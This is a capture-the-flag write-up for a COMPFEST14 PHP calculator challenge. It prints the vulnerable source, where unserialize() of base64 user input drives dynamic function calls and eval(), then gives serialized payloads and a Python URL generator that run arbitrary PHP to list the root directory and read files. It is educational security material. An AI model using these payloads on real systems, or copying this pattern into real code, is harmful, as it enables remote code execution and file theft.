## Overview
After opening the website, we are greeted with a simple calculator (obviously). Lets input ```1 + 2``` to the textbox.

```
Result:
1 + 2 = 3
```
As expected, 1 + 2 does equal to 3. The interesting part of this is the url. 

```103.185.38.238:17227/?input=YTozOntpOjA7czozOiJzdW0iO2k6MTtzOjE6IjEiO2k6MjtzOjE6IjIiO30=```

It has some sort of encrypted input query that I assumed is base64. Let's try to decode the input with this script.

```python
import base64

query = "YTozOntpOjA7czozOiJzdW0iO2k6MTtzOjE6IjEiO2k6MjtzOjE6IjIiO30="
query_b64 = base64.b64decode(query)
print(query_b64.decode("ascii"))
```
After running the script, we got this very interesting data.

```a:3:{i:0;s:3:"sum";i:1;s:1:"1";i:2;s:1:"2";}```

Let's dissect this data.

```
a:3  # Array of length 3
i:0 # Index of the array
s:3 # Size of this index's data
"sum" # The data on this index
```

Okay, that's very insightful. But, this is a web exploitation challenge. Let's look at the PHP of this website since this challenge is tagged PHP.

```php
<?php
function format_error($expre) {
    return "<p><b>Format error:</b> the input is given in wrong format!</p>";
}

function opp_error($expre) {
    return "<p><b>Operator error:</b> operator for ".$expre." is not available!</p>";
}

function sum($a, $b) {
    $result = strval(intval($a) + intval($b));
    return "<p><b>Result:</b><br>".$a." + ".$b." = ".$result."</p>";
}

function sub($a, $b) {
    $result = strval(intval($a) - intval($b));
    return "<p><b>Result:</b><br>".$a." - ".$b." = ".$result."</p>";
}

function mul($a, $b) {
    $result = strval(intval($a) * intval($b));
    return "<p><b>Result:</b><br>".$a." * ".$b." = ".$result."</p>";
}

function div($a, $b) {
    $result = strval(intval($a) / intval($b));
    return "<p><b>Result:</b><br>".$a." / ".$b." = ".$result."</p>";
}

function evalit($code) {
    return eval($code);
}

if ($_SERVER["REQUEST_METHOD"] == "GET") {
    if (!empty($_GET["input"])) {
        $decoded = base64_decode($_GET["input"]);
        $out = unserialize($decoded);
        if ($out[2] != null) {
            $view = $out[0]($out[1], $out[2]);
            echo $view;
        }
        else {
            $view = $out[0]($out[1]);
            echo $view;
        }
    }
}

?>
```

The ```evalit``` function is definitely the key, since it can allow us to run code. But how can we input something to run the ```evalit``` function?

The ```sum``` function and other math functions have 2 arguments. So to run ```evalit```, we need to find other functions with only one argument. The easiest one to get is probably the ```format_error``` function. 

## Solution
Let's input random stuff and get the input query!

```
a:2:{i:0;s:12:"format_error";i:1;s:4:"asdf";}
```

Woah, the function's name is literally there! So let's just change the fuction name and input and let's see if it works!

```
a:2:{i:0;s:6:"evalit";i:1;s:20:"echo "Hello world!";";}
```

Next step is to encode it to base64 and put it in the url!

```
103.185.38.238:17227/?input=YToyOntpOjA7czo2OiJldmFsaXQiO2k6MTtzOjIwOiJlY2hvICJIZWxsbyB3b3JsZCEiOyI7fQ==
```

And voila! The hello world is there. Now what? Well, the description said there is some interesting stuff in root. So let's go there!
Let's scan the root directory using the ```scandir()``` syntax.

To make this easier, I created a python script to generate the url.

```python
import base64

payload = "echo join(', ', scandir('/'));"
query = "a:2:{i:0;s:6:\"evalit\";i:1;s:" + str(len(payload)) + ":\"" + payload + "\";}"
query_b64 = query.encode("ascii")
query_b64 = base64.b64encode(query_b64)
print(query)
print("103.185.38.238:17227/?input=" + query_b64.decode("ascii"))
```

After that, let's look at the output!

```., .., .dockerenv, Hey.txt, Heyhey.txt, Heyheyhey.txt, Heyheyheyhey.txt, bin, boot, dev, etc, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, sys, tmp, usr, var```

We see some txt files in there. It could be the flag! Let's try one of them.
Let's change the payload.

```
payload = "echo file_get_contents('/Hey.txt');"
Output: Sorry, wrong guy :v 
```

Bruh, let's try the next one.

```
payload = "echo file_get_contents('/Heyhey.txt');"
Output: Hai! Hai! (^_^)  
```

Still not it, the next one maybe?

```
payload = "echo file_get_contents('/Heyheyhey.txt');"
Output: COMPFEST14{welcome_to_the_root} 
```

And just like that, the flag is found!

##### Solved by kawijayaa
